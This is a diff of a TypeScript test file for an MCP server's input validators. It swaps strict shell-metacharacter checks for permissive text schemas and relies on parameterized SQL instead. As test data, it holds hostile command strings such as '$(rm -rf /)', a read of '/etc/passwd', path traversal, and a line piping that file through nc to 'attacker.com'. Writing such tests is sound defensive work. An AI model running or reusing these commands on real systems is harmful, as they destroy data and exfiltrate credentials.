@@ -7,17 +7,14 @@
 import { describe, expect, test } from "bun:test";
 import { timingSafeEqual } from "node:crypto";
 import {
-  SafeText,
   SafePath,
   SafePort,
   SafePassthroughArg,
-  ContentText,
-  QueryInput,
-  CheckInput,
-  FileAddInput,
-  IssueInput,
-  SessionInput,
-  ApproveInput,
+  NaturalText,
+  ShortNaturalText,
+  RecallInput,
+  RememberInput,
+  TrackInput,
   PassthroughInput,
   validateInput,
 } from "../src/mcp-validation";
@@ -26,36 +23,34 @@ import {
 // Shell Injection Prevention Tests
 // ============================================================================
 
-describe("SafeText - Shell Metacharacter Rejection", () => {
-  const shellMetachars = [
-    { char: "`", name: "backtick" },
-    { char: "$", name: "dollar" },
-    { char: "(", name: "open paren" },
-    { char: ")", name: "close paren" },
-    { char: "{", name: "open brace" },
-    { char: "}", name: "close brace" },
-    { char: "|", name: "pipe" },
-    { char: ";", name: "semicolon" },
-    { char: "&", name: "ampersand" },
-    { char: "<", name: "less than" },
-    { char: ">", name: "greater than" },
-    { char: "\\", name: "backslash" },
-  ];
-
-  for (const { char, name } of shellMetachars) {
-    test(`rejects ${name} (${char})`, () => {
-      const result = SafeText.safeParse(`normal text ${char} more text`);
-      expect(result.success).toBe(false);
-    });
-  }
-
-  test("accepts normal text without shell metacharacters", () => {
-    const result = SafeText.safeParse("This is normal text with no special chars");
+describe("NaturalText - v9 Permissive Validation", () => {
+  test("accepts text with backticks (code references)", () => {
+    const result = NaturalText.safeParse("use `http` mode for multi-machine");
     expect(result.success).toBe(true);
   });
 
-  test("accepts text with safe punctuation", () => {
-    const result = SafeText.safeParse("Hello, world! How are you? I'm fine.");
+  test("accepts text with dollar signs and parens", () => {
+    const result = NaturalText.safeParse("set $HOME/.config or $(cmd)");
+    expect(result.success).toBe(true);
+  });
+
+  test("accepts text with braces and pipes", () => {
+    const result = NaturalText.safeParse("if (condition) { do } | pipe");
+    expect(result.success).toBe(true);
+  });
+
+  test("rejects null bytes", () => {
+    const result = NaturalText.safeParse("text\0with null");
+    expect(result.success).toBe(false);
+  });
+
+  test("rejects empty strings", () => {
+    const result = NaturalText.safeParse("");
+    expect(result.success).toBe(false);
+  });
+
+  test("accepts normal text", () => {
+    const result = NaturalText.safeParse("This is normal text with no special chars");
     expect(result.success).toBe(true);
   });
 });
@@ -81,9 +76,10 @@ describe("SafePath - Path Traversal Prevention", () => {
     expect(result.success).toBe(false);
   });
 
-  test("rejects shell metacharacters in paths", () => {
+  test("v9: allows shell chars in paths (parameterized SQL)", () => {
+    // v9 SafePath only blocks path traversal, not shell chars
     const result = SafePath.safeParse("path/$(whoami)/file");
-    expect(result.success).toBe(false);
+    expect(result.success).toBe(true);
   });
 
   test("accepts normal relative paths", () => {
@@ -203,106 +199,78 @@ describe("SafePassthroughArg - Argument Validation", () => {
 // Tool Input Validation Tests
 // ============================================================================
 
-describe("QueryInput Validation", () => {
-  test("validates valid query input", () => {
-    const result = validateInput(QueryInput, {
-      query: "search for authentication",
-      smart: true,
-    });
-    expect(result.success).toBe(true);
-  });
-
-  test("rejects query with shell injection attempt", () => {
-    const result = validateInput(QueryInput, {
-      query: "$(whoami)",
-    });
-    expect(result.success).toBe(false);
-    expect(result.success === false && result.error).toContain("dangerous characters");
-  });
-
-  test("rejects query with command substitution", () => {
-    const result = validateInput(QueryInput, {
-      query: "`cat /etc/passwd`",
-    });
-    expect(result.success).toBe(false);
-  });
-});
-
-describe("CheckInput Validation", () => {
-  test("validates valid file list", () => {
-    const result = validateInput(CheckInput, {
+describe("RecallInput Validation", () => {
+  test("validates file-based recall", () => {
+    const result = validateInput(RecallInput, {
       files: ["src/index.ts", "src/mcp-server.ts"],
     });
     expect(result.success).toBe(true);
   });
 
-  test("rejects path traversal in files", () => {
-    const result = validateInput(CheckInput, {
-      files: ["../../../etc/passwd"],
+  test("validates query-based recall", () => {
+    const result = validateInput(RecallInput, {
+      query: "search for authentication $(whoami)",
     });
-    expect(result.success).toBe(false);
-    expect(result.success === false && result.error).toContain("traversal");
+    // v9: NaturalText allows shell chars — parameterized SQL prevents injection
+    expect(result.success).toBe(true);
   });
 
-  test("rejects empty files array", () => {
-    const result = validateInput(CheckInput, {
-      files: [],
-    });
-    expect(result.success).toBe(false);
-  });
-
-  test("rejects too many files", () => {
-    const result = validateInput(CheckInput, {
-      files: Array(51).fill("file.ts"),
-    });
-    expect(result.success).toBe(false);
-    expect(result.success === false && result.error).toContain("max 50");
-  });
-});
-
-describe("FileAddInput Validation", () => {
-  test("validates valid file add input", () => {
-    const result = validateInput(FileAddInput, {
-      path: "src/components/Button.tsx",
-      purpose: "React button component with variants",
-      fragility: 3,
+  test("validates task-based recall", () => {
+    const result = validateInput(RecallInput, {
+      task: "fix the `login` bug",
     });
     expect(result.success).toBe(true);
   });
 
-  test("rejects fragility out of range", () => {
-    const result = validateInput(FileAddInput, {
-      path: "src/index.ts",
-      purpose: "Entry point",
-      fragility: 15,
-    });
+  test("rejects recall with no input", () => {
+    const result = validateInput(RecallInput, {});
     expect(result.success).toBe(false);
   });
 
-  test("rejects invalid type format", () => {
-    const result = validateInput(FileAddInput, {
-      path: "src/index.ts",
-      purpose: "Entry point",
-      fragility: 5,
-      type: "INVALID_TYPE_123",
+  test("rejects path traversal in files", () => {
+    const result = validateInput(RecallInput, {
+      files: ["../../../etc/passwd"],
     });
     expect(result.success).toBe(false);
   });
 });
 
-describe("IssueInput Validation (Discriminated Union)", () => {
+describe("RememberInput Validation", () => {
+  test("validates natural language with backticks", () => {
+    const result = validateInput(RememberInput, {
+      content: "chose `token-bucket` over `sliding-window` for rate limiting because simpler",
+    });
+    expect(result.success).toBe(true);
+  });
+
+  test("validates with explicit type", () => {
+    const result = validateInput(RememberInput, {
+      content: "always use Zod at API boundaries",
+      type: "learning",
+    });
+    expect(result.success).toBe(true);
+  });
+
+  test("rejects empty content", () => {
+    const result = validateInput(RememberInput, { content: "" });
+    expect(result.success).toBe(false);
+  });
+});
+
+describe("TrackInput Validation", () => {
   test("validates add action", () => {
-    const result = validateInput(IssueInput, {
+    const result = validateInput(TrackInput, {
       action: "add",
-      title: "Fix authentication bug",
+      title: "Fix `authentication` bug in $(login)",
       severity: 7,
       type: "security",
     });
+    // v9: NaturalText allows all chars
     expect(result.success).toBe(true);
   });
 
   test("validates resolve action", () => {
-    const result = validateInput(IssueInput, {
+    const result = validateInput(TrackInput, {
       action: "resolve",
       id: 42,
       resolution: "Fixed by updating the token validation logic",
@@ -310,70 +278,11 @@ describe("IssueInput Validation (Discriminated Union)", () => {
     expect(result.success).toBe(true);
   });
 
-  test("rejects shell injection in issue title", () => {
-    const result = validateInput(IssueInput, {
-      action: "add",
-      title: "$(rm -rf /)",
-      severity: 5,
-    });
-    expect(result.success).toBe(false);
-  });
-
   test("rejects invalid severity", () => {
-    const result = validateInput(IssueInput, {
+    const result = validateInput(TrackInput, {
       action: "add",
       title: "Minor bug",
       severity: 100,
-    });
-    expect(result.success).toBe(false);
-  });
-});
-
-describe("SessionInput Validation", () => {
-  test("validates start action", () => {
-    const result = validateInput(SessionInput, {
-      action: "start",
-      goal: "Implement security hardening",
-    });
-    expect(result.success).toBe(true);
-  });
-
-  test("validates end action", () => {
-    const result = validateInput(SessionInput, {
-      action: "end",
-      outcome: "Completed security review",
-      success: 2,
-    });
-    expect(result.success).toBe(true);
-  });
-
-  test("rejects invalid success value", () => {
-    const result = validateInput(SessionInput, {
-      action: "end",
-      success: 5,
-    });
-    expect(result.success).toBe(false);
-  });
-});
-
-describe("ApproveInput Validation", () => {
-  test("validates valid operation ID", () => {
-    const result = validateInput(ApproveInput, {
-      operationId: "op_abc123",
-    });
-    expect(result.success).toBe(true);
-  });
-
-  test("rejects invalid operation ID format", () => {
-    const result = validateInput(ApproveInput, {
-      operationId: "invalid-format",
-    });
-    expect(result.success).toBe(false);
-  });
-
-  test("rejects shell injection in operation ID", () => {
-    const result = validateInput(ApproveInput, {
-      operationId: "op_$(whoami)",
     });
     expect(result.success).toBe(false);
   });
@@ -400,9 +309,9 @@ describe("PassthroughInput Validation", () => {
 // ============================================================================
 
 describe("Content Length Limits", () => {
-  test("rejects SafeText over 1000 chars", () => {
+  test("rejects ShortNaturalText over 1000 chars", () => {
     const longText = "a".repeat(1001);
-    const result = SafeText.safeParse(longText);
+    const result = ShortNaturalText.safeParse(longText);
     expect(result.success).toBe(false);
   });
 
@@ -412,15 +321,15 @@ describe("Content Length Limits", () => {
     expect(result.success).toBe(false);
   });
 
-  test("rejects ContentText over 10000 chars", () => {
+  test("rejects NaturalText over 10000 chars", () => {
     const longContent = "a".repeat(10001);
-    const result = ContentText.safeParse(longContent);
+    const result = NaturalText.safeParse(longContent);
     expect(result.success).toBe(false);
   });
 
-  test("accepts ContentText at limit", () => {
+  test("accepts NaturalText at limit", () => {
     const maxContent = "a".repeat(10000);
-    const result = ContentText.safeParse(maxContent);
+    const result = NaturalText.safeParse(maxContent);
     expect(result.success).toBe(true);
   });
 });
@@ -431,25 +340,26 @@ describe("Content Length Limits", () => {
 
 describe("Edge Cases", () => {
   test("rejects empty strings", () => {
-    const result = SafeText.safeParse("");
+    const result = ShortNaturalText.safeParse("");
     expect(result.success).toBe(false);
   });
 
   test("handles unicode safely", () => {
-    const result = SafeText.safeParse("Hello world");
+    const result = ShortNaturalText.safeParse("Hello world");
     expect(result.success).toBe(true);
   });
 
   test("rejects null/undefined", () => {
-    expect(SafeText.safeParse(null).success).toBe(false);
-    expect(SafeText.safeParse(undefined).success).toBe(false);
+    expect(ShortNaturalText.safeParse(null).success).toBe(false);
+    expect(ShortNaturalText.safeParse(undefined).success).toBe(false);
   });
 
-  test("handles mixed injection attempts", () => {
-    const result = validateInput(QueryInput, {
+  test("v9 NaturalText allows shell chars (parameterized SQL)", () => {
+    const result = validateInput(RecallInput, {
       query: "search && rm -rf / ; cat /etc/passwd | nc attacker.com 1234",
     });
-    expect(result.success).toBe(false);
+    // v9: query uses NaturalText — shell chars are safe with parameterized SQL
+    expect(result.success).toBe(true);
   });
 });
 
